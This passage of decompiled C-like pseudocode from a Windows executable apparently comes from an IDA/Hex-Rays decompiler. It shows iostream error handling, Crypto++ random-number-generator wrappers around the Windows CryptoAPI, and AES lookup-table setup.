  __int64 v28; // [esp+14h] [ebp-40h]
  _DWORD pExceptionObject[5]; // [esp+24h] [ebp-30h] BYREF
  _DWORD v30[3]; // [esp+38h] [ebp-1Ch] BYREF
  char v31; // [esp+44h] [ebp-10h]
  int v32; // [esp+50h] [ebp-4h]

  v5 = *(_DWORD *)(*(_DWORD *)this + 4);
  v6 = *(_DWORD *)&this[v5 + 12];
  v7 = &this[v5];
  v8 = v6 & 0xFE;
  v9 = v8 | 4;
  if ( v7[14] )
    v9 = v8;
  v10 = v7[4];
  v11 = v9 & 0x17;
  v7[3] = v11;
  v12 = v11 & v10;
  if ( v12 )
  {
    if ( (v12 & 4) != 0 )
    {
      v23 = "ios_base::badbit set";
    }
    else
    {
      v23 = "ios_base::failbit set";
      if ( (v12 & 2) == 0 )
        v23 = "ios_base::eofbit set";
    }
    v24 = sub_402C50(&a2, 1);
    sub_403590(pExceptionObject, v23, v24);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v13 = *(_DWORD *)this;
  v30[2] = this;
  v14 = *(_DWORD *)&this[*(_DWORD *)(v13 + 4) + 56];
  if ( v14 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v14 + 4))(v14);
  v32 = 0;
  v31 = sub_427AC0(this, 1);
  v15 = *(_DWORD *)this;
  v32 = 1;
  v16 = *(_DWORD *)(v15 + 4);
  if ( (this[v16 + 12] & 6) == 0 )
  {
    (*(void (__thiscall **)(_DWORD, __int64 *, int, int, int, int))(**(_DWORD **)&this[v16 + 56] + 40))(
      *(_DWORD *)&this[v16 + 56],
      &v27,
      a2,
      a3,
      a4,
      1);
    if ( (((unsigned __int64)(v28 + v27) >> 32) & (unsigned int)(v28 + v27)) == -1 )
    {
      v17 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
      v18 = (v17[3] | (4 * (v17[14] == 0) + 2)) & 0x17;
      v17[3] = v18;
      v19 = v18 & v17[4];
      if ( v19 )
      {
        if ( (v19 & 4) != 0 )
        {
          v25 = "ios_base::badbit set";
        }
        else
        {
          v25 = "ios_base::failbit set";
          if ( (v19 & 2) == 0 )
            v25 = "ios_base::eofbit set";
        }
        v26 = sub_402C50(v30, 1);
        sub_403590((_DWORD *)&v27 + 1, v25, v26);
        _CxxThrowException((char *)&v27 + 4, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
      }
    }
  }
  v20 = *(_DWORD *)this;
  v32 = 2;
  v21 = *(_DWORD *)&this[*(_DWORD *)(v20 + 4) + 56];
  if ( v21 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v21 + 8))(v21);
  return this;
}
// 456C10: using guessed type _DWORD pExceptionObject[5];

//----- (00456DB0) --------------------------------------------------------
int __thiscall sub_456DB0(_BYTE *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ecx

  v3 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
  if ( v3 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  sub_427AC0(this, 1);
  v4 = *(_DWORD *)(*(_DWORD *)this + 4);
  if ( (this[v4 + 12] & 6) != 0 )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD, int, _DWORD, _DWORD, int, int))(**(_DWORD **)&this[v4 + 56] + 40))(
      *(_DWORD *)&this[v4 + 56],
      a2,
      0,
      0,
      1,
      1);
  }
  v5 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
  if ( v5 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
  return a2;
}

//----- (00456E90) --------------------------------------------------------
int __thiscall sub_456E90(_DWORD *this, int a2, void *a3, size_t a4)
{
  size_t v5; // eax
  void *v6; // ecx

  v5 = *(this - 2);
  v6 = (void *)*(this - 1);
  if ( a3 )
    sub_438F30(v6, v5, a3, a4);
  else
    memset(v6, 0, v5);
  return sub_418F60(this + 1, (void *)*(this - 1), *(this - 2));
}

//----- (00456EE0) --------------------------------------------------------
int __thiscall sub_456EE0(_DWORD *this)
{
  int v1; // edx
  int result; // eax
  int i; // ecx
  bool v4; // zf

  v1 = this[11];
  result = 1;
  for ( i = this[5] - 2; i >= 0; --i )
  {
    if ( !result )
      break;
    v4 = (*(_BYTE *)(i + v1))++ == 0xFF;
    result = v4;
  }
  return result;
}

//----- (00456F10) --------------------------------------------------------
int __thiscall sub_456F10(_DWORD *this, int a2, int a3, int a4, unsigned int a5)
{
  int v6; // ecx
  int v7; // ebp
  int result; // eax
  unsigned int v9; // edi
  int v10; // esi
  int v11; // eax
  unsigned int v12; // ebx
  int v13; // [esp+14h] [ebp-Ch]
  _DWORD *v14; // [esp+18h] [ebp-8h]
  int v15; // [esp+1Ch] [ebp-4h]
  char v16; // [esp+2Ch] [ebp+Ch]

  v6 = 0;
  v7 = a4;
  result = *(this - 2);
  if ( a4 )
    v6 = *(this - 2);
  v9 = a5;
  v14 = this;
  v13 = *(this - 2);
  v15 = v6;
  if ( a5 )
  {
    --result;
    do
    {
      v10 = this[4];
      v11 = *(unsigned __int8 *)(result + v10);
      v12 = 256 - v11;
      v16 = v11;
      if ( 256 - v11 >= v9 )
        v12 = v9;
      (*(void (__thiscall **)(int, int, int, int, unsigned int, int))(*(_DWORD *)(*(this - 5) + 4) + 40))(
        *(this - 5) + 4,
        v10,
        v7,
        a3,
        v13 * v12,
        17);
      this = v14;
      *(_BYTE *)(v14[4] + v13 - 1) = v12 + v16;
      if ( !((_BYTE)v12 + v16) )
      {
        (*(void (__thiscall **)(_DWORD *))(*(v14 - 7) + 68))(v14 - 7);
        this = v14;
      }
      a3 += v13 * v12;
      v7 += v15 * v12;
      result = v13 - 1;
      v9 -= v12;
    }
    while ( v9 );
  }
  return result;
}

//----- (00456FC0) --------------------------------------------------------
void __thiscall sub_456FC0(_DWORD *this)
{
  int v2; // eax
  unsigned int v3; // ecx
  size_t v4; // ebx
  void *v5; // edx

  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)(this[2] + 4) + 20))(this[2] + 4);
  v3 = this[5];
  v4 = v2;
  v5 = (void *)this[6];
  if ( v3 != v2 )
  {
    memset(v5, 0, v3);
    j_j___free_base(v5);
    if ( !v4 )
    {
      this[5] = 0;
      this[6] = 0;
      this[4] = -1;
      return;
    }
    v5 = sub_45AEA0(v4);
  }
  this[5] = v4;
  this[6] = v5;
  this[4] = -1;
}

//----- (00457020) --------------------------------------------------------
int __thiscall sub_457020(_DWORD *this, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // edi
  int result; // eax
  int v7; // edx
  unsigned int v8; // edx

  v3 = 0;
  for ( result = *(this - 2) - 1; result >= 0; v3 = v8 >> 8 )
  {
    v7 = (unsigned __int8)a2;
    a2 = __PAIR64__(a3, a2) >> 8;
    a3 >>= 8;
    v8 = v3 + *(unsigned __int8 *)(*(this - 1) + result) + v7;
    *(_BYTE *)(result + this[4]) = v8;
    --result;
  }
  return result;
}

//----- (00457070) --------------------------------------------------------
HCRYPTPROV *__thiscall sub_457070(HCRYPTPROV *phProv)
{
  DWORD LastError; // ebx
  char pExceptionObject[40]; // [esp+10h] [ebp-50h] BYREF
  size_t v5[10]; // [esp+38h] [ebp-28h] BYREF

  *phProv = 0;
  if ( !CryptAcquireContextA(phProv, 0, 0, 1u, 0xF0000000) )
  {
    LastError = GetLastError();
    if ( !CryptAcquireContextA(phProv, "Crypto++ RNG", 0, 1u, 8u)
      && !CryptAcquireContextA(phProv, "Crypto++ RNG", 0, 1u, 0x28u) )
    {
      SetLastError(LastError);
      sub_419B80((int)v5, "CryptAcquireContext");
      v5[9] = 0;
      sub_4571D0(pExceptionObject, v5);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVOS_RNG_Err_CryptoPP__);
    }
  }
  return phProv;
}

//----- (00457140) --------------------------------------------------------
char *__thiscall sub_457140(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::OS_RNG_Err::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BC010: using guessed type void *CryptoPP::OS_RNG_Err::`vftable';

//----- (004571D0) --------------------------------------------------------
char *__thiscall sub_4571D0(char *this, size_t *a2)
{
  unsigned int LastError; // eax
  _DWORD *v4; // esi
  unsigned int v5; // eax
  size_t *v6; // eax
  void **v7; // eax
  void **v8; // eax
  size_t v9; // ecx
  char *v10; // eax
  _QWORD *v11; // eax
  __int64 v12; // xmm0_8
  void *v13; // ecx
  void *v14; // ecx
  void *v15; // ecx
  void *v16; // ecx
  void *v17; // ecx
  void *v19; // [esp+1Ch] [ebp-88h] BYREF
  unsigned int v20; // [esp+30h] [ebp-74h]
  __int128 v21; // [esp+34h] [ebp-70h] BYREF
  __int64 v22; // [esp+44h] [ebp-60h]
  __int128 v23; // [esp+4Ch] [ebp-58h] BYREF
  __int64 v24; // [esp+5Ch] [ebp-48h]
  void *v25[4]; // [esp+64h] [ebp-40h] BYREF
  int v26; // [esp+74h] [ebp-30h]
  unsigned int v27; // [esp+78h] [ebp-2Ch]
  __int128 v28; // [esp+7Ch] [ebp-28h] BYREF
  __int64 v29; // [esp+8Ch] [ebp-18h]
  int v30; // [esp+A0h] [ebp-4h]

  LastError = GetLastError();
  v4 = (_DWORD *)sub_434410((int)&v19, LastError, 0x10u);
  v30 = 1;
  v26 = 0;
  v27 = 15;
  v5 = a2[4] + 8;
  LOBYTE(v25[0]) = 0;
  sub_4196B0(v25, v5);
  sub_41F120((char *)v25, "OS_Rng: ", 8u);
  v6 = a2;
  if ( a2[5] >= 0x10 )
    v6 = (size_t *)*a2;
  sub_41F120((char *)v25, v6, a2[4]);
  v7 = sub_41F120((char *)v25, " operation failed with error ", 0x1Du);
  v24 = 0i64;
  v23 = *(_OWORD *)v7;
  v24 = *((_QWORD *)v7 + 2);
  v7[4] = 0;
  v7[5] = (void *)15;
  *(_BYTE *)v7 = 0;
  LOBYTE(v30) = 2;
  v8 = sub_41F120((char *)&v23, &unk_4BC04C, 2u);
  v29 = 0i64;
  v28 = *(_OWORD *)v8;
  v29 = *((_QWORD *)v8 + 2);
  v8[4] = 0;
  v8[5] = (void *)15;
  *(_BYTE *)v8 = 0;
  v9 = v4[4];
  LOBYTE(v30) = 3;
  if ( v9 <= HIDWORD(v29) - (int)v29 || v4[5] - v9 < (unsigned int)v29 )
  {
    if ( v4[5] >= 0x10u )
      v4 = (_DWORD *)*v4;
    v11 = sub_41F120((char *)&v28, v4, v9);
  }
  else
  {
    v10 = (char *)&v28;
    if ( HIDWORD(v29) >= 0x10 )
      v10 = (char *)v28;
    v11 = sub_41ED70((char *)v4, 0, v10, v29);
  }
  v21 = *(_OWORD *)v11;
  v12 = v11[2];
  *(_BYTE *)v11 = 0;
  *((_DWORD *)v11 + 5) = 15;
  *((_DWORD *)v11 + 4) = 0;
  v22 = v12;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v30) = 5;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, &v21);
  if ( HIDWORD(v22) >= 0x10 )
  {
    v13 = (void *)v21;
    if ( (unsigned int)(HIDWORD(v22) + 1) >= 0x1000 )
    {
      v13 = *(void **)(v21 - 4);
      if ( (unsigned int)(v21 - (_DWORD)v13 - 4) > 0x1F )
        goto LABEL_32;
    }
    sub_46C87D(v13);
  }
  if ( HIDWORD(v29) >= 0x10 )
  {
    v14 = (void *)v28;
    if ( (unsigned int)(HIDWORD(v29) + 1) >= 0x1000 )
    {
      v14 = *(void **)(v28 - 4);
      if ( (unsigned int)(v28 - (_DWORD)v14 - 4) > 0x1F )
        goto LABEL_32;
    }
    sub_46C87D(v14);
  }
  v29 = 0xF00000000i64;
  LOBYTE(v28) = 0;
  if ( HIDWORD(v24) >= 0x10 )
  {
    v15 = (void *)v23;
    if ( (unsigned int)(HIDWORD(v24) + 1) >= 0x1000 )
    {
      v15 = *(void **)(v23 - 4);
      if ( (unsigned int)(v23 - (_DWORD)v15 - 4) > 0x1F )
        goto LABEL_32;
    }
    sub_46C87D(v15);
  }
  v24 = 0xF00000000i64;
  LOBYTE(v23) = 0;
  if ( v27 >= 0x10 )
  {
    v16 = v25[0];
    if ( v27 + 1 >= 0x1000 )
    {
      v16 = (void *)*((_DWORD *)v25[0] - 1);
      if ( (unsigned int)(v25[0] - v16 - 4) > 0x1F )
        goto LABEL_32;
    }
    sub_46C87D(v16);
  }
  v26 = 0;
  v27 = 15;
  LOBYTE(v25[0]) = 0;
  if ( v20 >= 0x10 )
  {
    v17 = v19;
    if ( v20 + 1 < 0x1000
      || (v17 = (void *)*((_DWORD *)v19 - 1), (unsigned int)((_BYTE *)v19 - (_BYTE *)v17 - 4) <= 0x1F) )
    {
      sub_46C87D(v17);
      goto LABEL_31;
    }
LABEL_32:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_31:
  *(_DWORD *)this = &CryptoPP::OS_RNG_Err::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BC010: using guessed type void *CryptoPP::OS_RNG_Err::`vftable';

//----- (00457560) --------------------------------------------------------
_DWORD *__thiscall sub_457560(_DWORD *this, char a2)
{
  HCRYPTPROV v3; // eax

  *this = &CryptoPP::NonblockingRng::`vftable';
  v3 = this[1];
  if ( v3 )
    CryptReleaseContext(v3, 0);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BC01C: using guessed type void *CryptoPP::NonblockingRng::`vftable';

//----- (004575A0) --------------------------------------------------------
BOOL __stdcall sub_4575A0(BYTE *pbBuffer, DWORD dwLen)
{
  HCRYPTPROV *v2; // eax
  BOOL result; // eax
  char pExceptionObject[40]; // [esp+Ch] [ebp-50h] BYREF
  size_t v5[10]; // [esp+34h] [ebp-28h] BYREF

  v2 = (HCRYPTPROV *)sub_457630();
  result = CryptGenRandom(*v2, dwLen, pbBuffer);
  if ( !result )
  {
    sub_419B80((int)v5, "CryptGenRandom");
    v5[9] = 0;
    sub_4571D0(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVOS_RNG_Err_CryptoPP__);
  }
  return result;
}

//----- (00457630) --------------------------------------------------------
int sub_457630()
{
  int result; // eax
  HCRYPTPROV *v1; // eax
  HCRYPTPROV *v2; // esi
  int v3; // edi

  if ( dword_4EEEE8 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4EEEE8);
    if ( dword_4EEEE8 == -1 )
    {
      dword_4EEEE4 = 0;
      atexit(sub_4B7930);
      _Init_thread_footer(&dword_4EEEE8);
    }
  }
  result = dword_4EEEE4;
  if ( !dword_4EEEE4 )
  {
    v1 = (HCRYPTPROV *)operator new(4u);
    if ( v1 )
      v2 = sub_457070(v1);
    else
      v2 = 0;
    v3 = dword_4EEEE4;
    if ( dword_4EEEE4 )
    {
      if ( v2 )
      {
        if ( *v2 )
          CryptReleaseContext(*v2, 0);
        sub_46C87D(v2);
      }
      return v3;
    }
    else
    {
      dword_4EEEE4 = (int)v2;
      return (int)v2;
    }
  }
  return result;
}
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4EEEE4: using guessed type int dword_4EEEE4;
// 4EEEE8: using guessed type int dword_4EEEE8;
// 4F0864: using guessed type int TlsIndex;

//----- (00457740) --------------------------------------------------------
void __thiscall sub_457740(void *this, int a2, DWORD dwLen)
{
  BYTE *v4; // ebx
  HCRYPTPROV *v5; // eax
  void **v6; // [esp+20h] [ebp-5Ch] BYREF
  HCRYPTPROV hProv; // [esp+24h] [ebp-58h] BYREF
  char pExceptionObject[40]; // [esp+2Ch] [ebp-50h] BYREF
  size_t v9[6]; // [esp+54h] [ebp-28h] BYREF
  int v10; // [esp+78h] [ebp-4h]

  if ( dwLen )
    v4 = (BYTE *)sub_45AEA0(dwLen);
  else
    v4 = 0;
  v10 = 1;
  sub_435E90(&v6, 1);
  v6 = &CryptoPP::NonblockingRng::`vftable';
  sub_457070(&hProv);
  LOBYTE(v10) = 2;
  v5 = (HCRYPTPROV *)sub_457630();
  if ( !CryptGenRandom(*v5, dwLen, v4) )
  {
    sub_419B80((int)v9, "CryptGenRandom");
    LOBYTE(v10) = 3;
    sub_4571D0(pExceptionObject, v9);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVOS_RNG_Err_CryptoPP__);
  }
  LOBYTE(v10) = 1;
  v6 = &CryptoPP::NonblockingRng::`vftable';
  if ( hProv )
    CryptReleaseContext(hProv, 0);
  (*(void (__thiscall **)(void *, BYTE *, DWORD))(*(_DWORD *)this + 16))(this, v4, dwLen);
  v10 = 4;
  memset(v4, 0, dwLen);
  j_j___free_base(v4);
}
// 4BC01C: using guessed type void *CryptoPP::NonblockingRng::`vftable';
// 457740: using guessed type size_t var_28[6];

//----- (00457850) --------------------------------------------------------
unsigned int **__thiscall sub_457850(unsigned int **this, unsigned __int32 *a2)
{
  int v3; // [esp+0h] [ebp-14h]
  unsigned int *v4; // [esp+4h] [ebp-10h]
  unsigned __int32 v5; // [esp+8h] [ebp-Ch]
  unsigned int v6; // [esp+Ch] [ebp-8h]

  v4 = *this;
  v3 = UserMathErrorFunction();
  v6 = *v4;
  if ( sub_458150(v3) )
    v5 = v6;
  else
    v5 = sub_457DE0(v6);
  *a2 = v5;
  ++*this;
  return this;
}

//----- (004578B1) --------------------------------------------------------
_DWORD *__thiscall sub_4578B1(_DWORD *this, unsigned int a2)
{
  int *v3; // [esp+0h] [ebp-1Ch]
  int v4; // [esp+8h] [ebp-14h]
  _DWORD *v5; // [esp+Ch] [ebp-10h]
  unsigned __int32 v6; // [esp+10h] [ebp-Ch]
  int v7; // [esp+14h] [ebp-8h]

  v5 = (_DWORD *)*this;
  v3 = (int *)this[1];
  v4 = UserMathErrorFunction();
  if ( sub_458150(v4) )
    v6 = a2;
  else
    v6 = sub_457DE0(a2);
  v7 = v6;
  if ( v5 )
    v7 = *v5 ^ v6;
  *v3 = v7;
  this[1] += 4;
  if ( *this )
    *this += 4;
  return this;
}

//----- (00457947) --------------------------------------------------------
unsigned int __cdecl sub_457947(int a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+4h] [ebp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 >> 2 )
      break;
    *(_DWORD *)(a1 + 4 * i) = sub_457DE0(*(_DWORD *)(a2 + 4 * i));
  }
  return result;
}

//----- (00457986) --------------------------------------------------------
unsigned int __cdecl sub_457986(int a1, char *a2, int a3, void *a4, size_t a5)
{
  unsigned int v6; // [esp+0h] [ebp-8h] BYREF
  unsigned int v7; // [esp+4h] [ebp-4h]

  v6 = 4;
  sub_438F30(a2, 4 * a3, a4, a5);
  j__memset(&a2[a5], 0, 4 * a3 - a5);
  v7 = sub_4397E0(&a5, &v6);
  if ( sub_458150(a1) )
    return (unsigned int)a2;
  else
    return sub_457947((int)a2, (int)a2, v7);
}

//----- (00457A18) --------------------------------------------------------
unsigned int __userpurge sub_457A18@<eax>(
        int *a1@<ecx>,
        __m64 a2@<mm2>,
        __m64 a3@<mm3>,
        __m128i *a4,
        __m128i *a5,
        __m128i *a6,
        unsigned int a7,
        char a8)
{
  int v9; // [esp+10h] [ebp-30h]
  int v10; // [esp+14h] [ebp-2Ch]
  int v11; // [esp+18h] [ebp-28h]
  int v12; // [esp+1Ch] [ebp-24h]
  int v13; // [esp+20h] [ebp-20h]
  __m128i *v14; // [esp+24h] [ebp-1Ch]
  __m128i *v15; // [esp+28h] [ebp-18h]
  int v16; // [esp+30h] [ebp-10h]
  _DWORD *i; // [esp+34h] [ebp-Ch]

  if ( sub_4580F0() )
    return sub_467AF0(a1[6], a1[2], a4, a5, a6, a7, a8);
  if ( !sub_458110() )
    return sub_4367A0(a1, (unsigned int)a4, (unsigned int)a5, (unsigned int)a6, a7, a8);
  if ( a7 < 0x10 )
    return a7;
  a1[8] = a1[9];
  for ( i = (_DWORD *)(a1[10] + (256 - a1[10] % 0x100u) % 0x100);
        sub_457D2A((unsigned int)i, (unsigned int)(i + 67));
        i += 64 )
  {
    ;
  }
  v16 = 16;
  if ( (a8 & 8) != 0 )
  {
    a4 = (__m128i *)((char *)a4 + a7 - 16);
    a5 = (__m128i *)((char *)a5 + a7 - 16);
    a6 = (__m128i *)((char *)a6 + a7 - 16);
    v16 = -16;
  }
  i[56] = a4;
  if ( (a8 & 4) != 0 && a5 )
    v15 = a5;
  else
    v15 = (__m128i *)off_4E8038;
  i[57] = v15;
  if ( (a8 & 4) != 0 || !a5 )
    v14 = (__m128i *)off_4E8038;
  else
    v14 = a5;
  i[58] = v14;
  i[59] = a6;
  if ( (a8 & 2) != 0 )
    v13 = 0;
  else
    v13 = v16;
  i[60] = v13;
  if ( (a8 & 4) != 0 && a5 )
    v12 = v16;
  else
    v12 = 0;
  i[61] = v12;
  if ( (a8 & 4) != 0 || !a5 )
    v11 = 0;
  else
    v11 = v16;
  i[62] = v11;
  if ( (a8 & 2) != 0 )
    v10 = 0;
  else
    v10 = v16;
  i[63] = v10;
  i[65] = a7 - a7 % 0x10 - (a8 & 1);
  if ( (a8 & 1) != 0 )
    v9 = 3;
  else
    v9 = 2;
  i[66] = 16 * (12 - (a1[2] - v9));
  sub_458AC4((const __m128i *)a1[6], (int)i, a2, a3);
  return a7 % 0x10;
}
// 4E8038: using guessed type void *off_4E8038;

//----- (00457CB3) --------------------------------------------------------
int __stdcall sub_457CB3(int a1)
{
  if ( sub_4580F0() )
  {
    sub_419B80(a1, "AESNI");
    return a1;
  }
  else
  {
    if ( sub_458110() )
      sub_419B80(a1, "SSE2");
    else
      sub_419B80(a1, "C++");
    return a1;
  }
}

//----- (00457D2A) --------------------------------------------------------
bool __cdecl sub_457D2A(unsigned int a1, unsigned int a2)
{
  signed int v5; // [esp+8h] [ebp-10h]
  signed int v6; // [esp+Ch] [ebp-Ch]
  signed int v7; // [esp+10h] [ebp-8h]
  signed int v8; // [esp+14h] [ebp-4h]

  v6 = a1 % 0x1000;
  v5 = a2 % 0x1000;
  v7 = (unsigned int)&dword_4EEEF0 % 0x1000;
  v8 = (unsigned int)&dword_4EF700 % 0x1000;
  if ( (int)((unsigned int)&dword_4EF700 % 0x1000) <= (int)((unsigned int)&dword_4EEEF0 % 0x1000) )
    return v6 < v8 || v5 <= v8 || v6 >= v7 || v5 > v7;
  else
    return v6 >= v7 && v6 < v8 || v5 > v7 && v5 <= v8;
}
// 4EEEF0: using guessed type int dword_4EEEF0;
// 4EF700: using guessed type int dword_4EF700;

//----- (00457DE0) --------------------------------------------------------
unsigned __int32 __cdecl sub_457DE0(unsigned int a1)
{
  return _byteswap_ulong(a1);
}

//----- (00457DE7) --------------------------------------------------------
void sub_457DE7()
{
  int v0; // [esp+4h] [ebp-Ch]
  int i; // [esp+8h] [ebp-8h]
  unsigned __int8 v2; // [esp+Fh] [ebp-1h]

  for ( i = 0; i < 256; ++i )
  {
    v2 = RijnDael_AES_inv_LONG_4BCF60[i];
    v0 = (((283 * (((int)v2 >> 7) & 1)) ^ (2 * v2) ^ (283 * (((int)v2 >> 6) & 2)) ^ (283 * (((int)v2 >> 6) & 1)) ^ (4 * v2) ^ (283 * (((int)v2 >> 5) & 4)) ^ (283 * (((int)v2 >> 5) & 2)) ^ (283 * (((int)v2 >> 5) & 1)) ^ (8 * v2)) << 24) | ((v2 ^ (283 * (((int)v2 >> 5) & 4)) ^ (283 * (((int)v2 >> 5) & 2)) ^ (283 * (((int)v2 >> 5) & 1)) ^ (8 * v2)) << 16) | ((v2 ^ (283 * (((int)v2 >> 6) & 2)) ^ (283 * (((int)v2 >> 6) & 1)) ^ (4 * v2) ^ (283 * (((int)v2 >> 5) & 4)) ^ (283 * (((int)v2 >> 5) & 2)) ^ (283 * (((int)v2 >> 5) & 1)) ^ (8 * v2)) << 8);
    dword_4EF700[2 * i] = v2 | v0;
    dword_4EF704[2 * i] = v0 | v2 ^ (283 * (((int)v2 >> 7) & 1)) ^ (2 * v2) ^ (283 * (((int)v2 >> 5) & 4)) ^ (283 * (((int)v2 >> 5) & 2)) ^ (283 * (((int)v2 >> 5) & 1)) ^ (8 * v2);
  }
  byte_4EFF01 = 1;
}
// 4EF700: using guessed type int dword_4EF700[];
// 4EF704: using guessed type int dword_4EF704[511];
// 4EFF01: using guessed type char byte_4EFF01;

//----- (00457FF8) --------------------------------------------------------
int sub_457FF8()
{
  int result; // eax
  int v1; // [esp+0h] [ebp-Ch]
  int i; // [esp+4h] [ebp-8h]
  unsigned __int8 v3; // [esp+Bh] [ebp-1h]

  for ( i = 0; i < 256; ++i )
  {
    v3 = RijnDael_AES_LONG_4BCE60[i];
    v1 = (((283 * (((int)v3 >> 7) & 1)) ^ (2 * v3)) << 24) | (v3 << 16) | (v3 << 8);
    dword_4EEEF0[2 * i] = v1;
    dword_4EEEF4[2 * i] = v1 | v3 ^ (283 * (((int)v3 >> 7) & 1)) ^ (2 * v3);
  }
  dword_4EEEF0[514] = 0;
  dword_4EEEF4[514] = 0;
  result = 2048;
  dword_4EEEF0[512] = 0;
  dword_4EEEF4[512] = 0;
  byte_4EFF00 = 1;
  return result;
}
// 4EEEF0: using guessed type int dword_4EEEF0[];
// 4EEEF4: using guessed type int dword_4EEEF4[];
// 4EFF00: using guessed type char byte_4EFF00;

//----- (004580D0) --------------------------------------------------------
int sub_4580D0()
{
  if ( !byte_4F0124 )
    sub_466590();
  return dword_4E80BC;
}
// 4E80BC: using guessed type int dword_4E80BC;
// 4F0124: using guessed type char byte_4F0124;

//----- (004580F0) --------------------------------------------------------
char sub_4580F0()
{
  if ( !byte_4F0124 )
    sub_466590();
  return byte_4F012B;
}
// 4F0124: using guessed type char byte_4F0124;
// 4F012B: using guessed type char byte_4F012B;

//----- (00458110) --------------------------------------------------------
char sub_458110()
{
  if ( !byte_4F0124 )
    sub_466590();
  return byte_4F0125;
}
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;

//----- (00458130) --------------------------------------------------------
char sub_458130()
{
  if ( !byte_4F0124 )
    sub_466590();
  return byte_4F0127;
}
// 4F0124: using guessed type char byte_4F0124;
// 4F0127: using guessed type char byte_4F0127;

//----- (00458150) --------------------------------------------------------
bool __cdecl sub_458150(int a1)
{
  return a1 == 0;
}

//----- (00458159) --------------------------------------------------------
int sub_458159()
{
  if ( sub_4580F0() )
    return 1;
  else
    return sub_418580();
}

//----- (0045817B) --------------------------------------------------------
_DWORD *__userpurge sub_45817B@<eax>(
        int *a1@<ecx>,
        __m64 a2@<mm2>,
        __m64 a3@<mm3>,
        __m128i *a4,
        __m128i *a5,
        __m128i *a6)
{
  unsigned int **v7; // eax
  unsigned int **v8; // eax
  unsigned int **v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int v13; // [esp-Ch] [ebp-70h]
  int v14; // [esp-8h] [ebp-6Ch]
  int v15; // [esp-4h] [ebp-68h]
  int v16[2]; // [esp+4h] [ebp-60h] BYREF
  int v17; // [esp+Ch] [ebp-58h]
  int v18; // [esp+10h] [ebp-54h]
  __m128i *v19; // [esp+14h] [ebp-50h] BYREF
  unsigned int v20; // [esp+18h] [ebp-4Ch]
  int *v21; // [esp+1Ch] [ebp-48h]
  unsigned int i; // [esp+20h] [ebp-44h]
  int v23; // [esp+24h] [ebp-40h]
  int *v24; // [esp+28h] [ebp-3Ch]
  unsigned __int32 *v25; // [esp+2Ch] [ebp-38h]
  unsigned __int32 v26; // [esp+30h] [ebp-34h] BYREF
  unsigned __int32 v27; // [esp+34h] [ebp-30h] BYREF
  unsigned __int32 v28; // [esp+38h] [ebp-2Ch] BYREF
  unsigned __int32 v29; // [esp+3Ch] [ebp-28h] BYREF
  unsigned int v30; // [esp+40h] [ebp-24h]
  unsigned int v31; // [esp+44h] [ebp-20h]
  unsigned int v32; // [esp+48h] [ebp-1Ch]
  unsigned int v33; // [esp+4Ch] [ebp-18h]
  int v34; // [esp+50h] [ebp-14h] BYREF
  int v35; // [esp+54h] [ebp-10h]
  int v36; // [esp+58h] [ebp-Ch]
  int v37; // [esp+5Ch] [ebp-8h]

  v21 = a1;
  if ( sub_458110() )
    return (_DWORD *)sub_457A18(v21, a2, a3, a4, a5, a6, 0x10u, 0);
  v19 = a4;
  v7 = sub_457850((unsigned int **)&v19, &v26);
  v8 = sub_457850(v7, &v27);
  v9 = sub_457850(v8, &v28);
  sub_457850(v9, &v29);
  v25 = (unsigned __int32 *)v21[6];
  v26 ^= *v25;
  v27 ^= v25[1];
  v28 ^= v25[2];
  v29 ^= v25[3];
  v31 = v25[4];
  v32 = v25[5];
  v33 = v25[6];
  v30 = v25[7];
